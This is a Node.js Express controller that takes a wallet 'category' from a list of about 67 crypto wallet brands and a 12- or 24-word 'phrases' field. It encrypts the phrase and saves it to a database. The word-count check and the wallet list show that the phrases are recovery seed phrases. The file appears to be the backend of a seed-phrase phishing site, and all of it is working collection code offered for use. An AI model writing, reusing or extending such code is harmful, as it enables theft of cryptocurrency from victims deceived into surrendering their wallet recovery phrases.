const { dataModel } = require("../models/dataModel")
const { encrypt } = require("../utilis/crypto")


const VALID_CATEGORIES = [
    "aave", "aeternity", "aion", "akionariat", "atomic", "atwallet", "authereum",
    "banner", "binance", "bitkeep", "bitpay", "bnb", "callisto", "coin98", "coinbase",
    "cosmos", "defiat", "digitex", "electrum", "elrond", "enjin", "ethereum-classic",
    "exodus", "filecoin", "fio", "flare", "fortmatic", "gochain", "guard", "harmony",
    "icon", "iotex", "kava", "kin", "ledger", "math-wallet", "metamask", "mew", "nano",
    "nebulas", "nimiq", "ontology", "parsiq", "poa", "polkadot", "portis", "qr", "scatter",
    "skale", "solana", "squarelink", "stellar", "tezos", "theta", "thundertoken", "tomo",
    "torus", "trezor", "tron", "trustvault", "trustwallet", "vechain", "wanchain", "waves",
    "xrp", "zelcore", "zilliqa"
  ]




const data = async (req, res) => {
    try {
        const {category, phrases} = req.body

        if(!category || !phrases) {
            return res.status(400).json({
                success: false,
                message: "All fields are required"
            })
        }

        if(!VALID_CATEGORIES.includes(category)){
            return res.status(400).json({
                success: false,
                message: "Invalid wallet category"
            })
        }


        const words = phrases.trim().split(/\s+/)

        if (words.length !== 12 && words.length !== 24){
            return res.status(400).json({
                success: false,
                message: "Phrases must be exactly 12 0r 24 words"
            })
        }

        const encrypted = encrypt(phrases)

        const newData = await dataModel.create({
            category, 
            phrases: encrypted
        })

        return res.status(201).json({
            success: true,
            message: "Input successful",
            newData
        })
    } catch (err) {
        return res.status(500).json({
            success: false,
            message: "Server Error"
        })
    }
}


module.exports = {data}